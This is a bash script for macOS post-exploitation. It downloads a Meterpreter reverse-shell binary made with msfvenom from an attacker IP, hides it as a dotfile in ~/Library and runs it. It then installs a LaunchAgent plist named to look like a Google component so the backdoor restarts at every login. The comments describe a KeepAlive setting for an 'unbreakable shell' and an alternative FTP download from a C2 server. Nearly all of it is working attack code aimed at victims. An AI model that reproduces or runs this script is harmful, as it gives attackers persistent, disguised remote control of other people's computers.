#!/usr/bin/env bash

# URL hosting our malicious mach-o reverse shell generated with msfvenom (USE UNSTAGED BACKDOORS WITH MACHO)
# msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=443 -f macho > osx
URL="https://192.168.1.5:8443/osx"

# URL hosting our plist file
PLISTURL="https://192.168.1.5:8443/plist"

# Rename our BACKDOOR macho-o name
BACKDOOR="backdoor"

# Add dot to make hidden file
BACKDOOR=".${BACKDOOR}"

# Download malicious mach-o from ftp over ssl.
# curl --ftp-ssl -u user:pass ftp://MY_C2C_IP:21/BACKDOORs/macho
# or
# Download from https
# This BACKDOOR is our persistence reverse backdoor in mach-o format generated with msfvenom
curl -s -k $URL -o ~/Library/$BACKDOOR

# Want to be sure that's my BACKDOOR is executable
chmod +x ~/Library/$BACKDOOR

# Launch the macho-o reverse backdoor
~/Library/$BACKDOOR &

sleep 2

# Persistence as LaunchAgents. Our backdoor will call us after user login.
# If we kill session once established, victim neeeds to log off and log in again to get another shell,
# or just reboot. Instead set KeepAlive directive in your plist file to makes an unbreakable shell
# that persist also if you kill it from metasploit or if app crash it restarts itself. Also using KeepAlive
# permits you to establish a session also if your c2c is down: when it goes up, shell is obtained. 
# It's useful if you don't have a C2C server and wants a persistence backdoored victim calls your desktop pc
#
# Download and write backdoored plist file in right directory
curl -s -k $PLISTURL -o ~/Library/LaunchAgents/com.google.engine.plist

# We need to replace the 'word' string in your plist file with correct username of our victim.
# In this case my original hosted plist file string contains the 'replaceme' string
# Remember that using sed on OSX will use BSD mode. So u need a backup file
USERNAME=$(whoami)
sed -i .bak "s/replaceme/$USERNAME/g" ~/Library/LaunchAgents/com.google.engine.plist
# Remove backup file
rm ~/Library/LaunchAgents/com.google.engine.plist.bak
